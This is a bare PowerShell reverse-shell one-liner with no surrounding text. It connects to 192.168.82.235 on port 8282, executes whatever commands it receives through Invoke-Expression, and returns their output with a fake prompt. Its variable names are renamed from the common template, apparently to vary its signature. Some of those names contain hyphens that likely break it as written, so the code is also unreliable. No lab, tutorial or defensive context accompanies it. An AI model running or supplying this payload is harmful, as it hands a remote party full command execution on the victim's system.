$Outpost = New-Object System.Net.Sockets.TCPClient("192.168.82.235",8282);$flow = $Outpost.GetStream();[byte[]]$info = 0..65535|%{0};while(($i = $flow.Read($info, 0, $info.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($info,0, $i);$return-call = (iex $data 2>&1 | Out-String );$return-call2 = $return-call + "PS " + (pwd).Path + "> ";$return-Data = ([text.encoding]::ASCII).GetBytes($return-call2);$flow.Write($return-Data,0,$return-Data.Length);$flow.Flush()};$Outpost.Close()
